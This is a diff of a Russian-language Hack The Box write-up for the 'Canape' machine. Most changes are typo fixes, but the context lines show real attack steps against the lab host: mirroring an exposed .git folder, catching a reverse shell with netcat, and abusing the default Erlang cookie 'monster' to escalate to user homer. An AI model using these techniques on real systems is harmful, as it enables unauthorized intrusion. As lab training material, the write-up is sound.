@@ -154,7 +154,7 @@ remote: Total 49 (delta 18), reused 0 (delta 0)
 Unpacking objects: 100% (49/49), done.
 ```
 
-Либо просто сделать оффлайн-слепок папки, как показано [здесь](https://en.internetwache.org/dont-publicly-expose-git-or-how-we-downloaded-your-websites-sourcecode-an-analysis-of-alexas-1m-28-07-2015 "Don't publicly expose .git or how we downloaded your website's sourcecode - An analysis of Alexa's 1M - Internetwache - A secure internet is our concern") (где также рассказывается, если вдруг это неочевидно, почему держать версионированный архив исходников сайта *в открытом доступе на самом сайте* не самая лучшая идея):
+Либо просто сделать офлайн-слепок папки, как показано [здесь](https://en.internetwache.org/dont-publicly-expose-git-or-how-we-downloaded-your-websites-sourcecode-an-analysis-of-alexas-1m-28-07-2015 "Don't publicly expose .git or how we downloaded your website's sourcecode - An analysis of Alexa's 1M - Internetwache - A secure internet is our concern") (где также рассказывается, если вдруг это неочевидно, почему держать версионированный архив исходников сайта *в открытом доступе на самом сайте* не самая лучшая идея):
 ```text
 root@kali:~# wget --mirror -I .git http://10.10.10.70/.git/
 ...
@@ -417,11 +417,11 @@ Ncat: Listening on :::31337
 Ncat: Listening on 0.0.0.0:31337
 Ncat: Connection from 10.10.10.70.
 Ncat: Connection from 10.10.10.70:54102.
+
 /bin/sh: 0: can't access tty; job control turned off
 $ python -c 'import pty;pty.spawn("/bin/bash")'
 www-data@canape:/$ ^Z
 [1]  + 24297 suspended  nc -nlvvp 31337
-
 root@kali:~# stty raw -echo; fg 
 [1]  + 24297 continued  nc -nlvvp 31337
 
@@ -582,7 +582,7 @@ homer@canape:~$ cat /home/homer/user.txt
 bce91869????????????????????????
 ```
 
-На этом заканчивает перый способ PrivEsc'а.
+На этом заканчивает первый способ PrivEsc'а.
 
 ## PrivEsc: www-data → homer. Способ 2
 Второй способ заключается в выполнении команд через *Erlang эмулятор*.
@@ -591,11 +591,11 @@ CouchDB написан на Erlang'е, а Erlang использует серве
 >CouchDB in cluster mode uses the port 5984 just as standalone, but it also uses 5986 for node-local APIs.
 >Erlang uses TCP port 4369 (EPMD) to find other nodes, so all servers must be able to speak to each other on this port. In an Erlang Cluster, all nodes are connected to all other nodes. A mesh.
 
-В [документации](http://docs.couchdb.org/en/stable/cluster/setup.html#cluster-setup "11.1. Set Up — Apache CouchDB 2.2 Documentation") СУБД красуется вывеска с надписью :warning: **Warning**:
+В [документации](http://docs.couchdb.org/en/stable/cluster/setup.html#cluster-setup "11.1. Set Up — Apache CouchDB 2.2 Documentation") же к СУБД красуется вывеска с надписью :warning: **Warning**:
 
 [![canape-couchdb-warning.png]({{ "/img/htb/boxes/canape/canape-couchdb-warning.png" | relative_url }})]({{ "/img/htb/boxes/canape/canape-couchdb-warning.png" | relative_url }})
 
-Что означает, что если `4369` "смотрит наружу интернета", то к нему можно будет подключиться любому желающему при наличии нужного cookie (cookie — единственный способ аутентификации, задействованный в этой схеме). Дефолтный куки для подключения к EPMD — "monster".
+Что означает, что если порт `4369` "смотрит наружу интернета", то к нему можно будет подключиться любому желающему при наличии нужного cookie (cookie — единственный способ аутентификации, задействованный в этой схеме). Дефолтные куки для подключения к EPMD — "monster".
 
 Посмотрим еще раз на запущенный процесс couchdb:
 ```text
@@ -603,7 +603,7 @@ www-data@canape:/$ ps auxww | grep monster
 homer       642  0.7  3.5 651392 34968 ?        Sl   03:12   2:59 /home/homer/bin/../erts-7.3/bin/beam -K true -A 16 -Bd -- -root /home/homer/bin/.. -progname couchdb -- -home /home/homer -- -boot /home/homer/bin/../releases/2.0.0/couchdb -name couchdb@localhost -setcookie monster -kernel error_logger silent -sasl sasl_error_logger false -noshell -noinput -config /home/homer/bin/../releases/2.0.0/sys.config
 ```
 
-Это он и есть: `... -setcookie monster ...`.
+Это и есть эти куки: `... -setcookie monster ...`.
 
 Выполним подключение к кластеру (предварительно настроив переменную `HOME`, как того требует документация):
 ```text
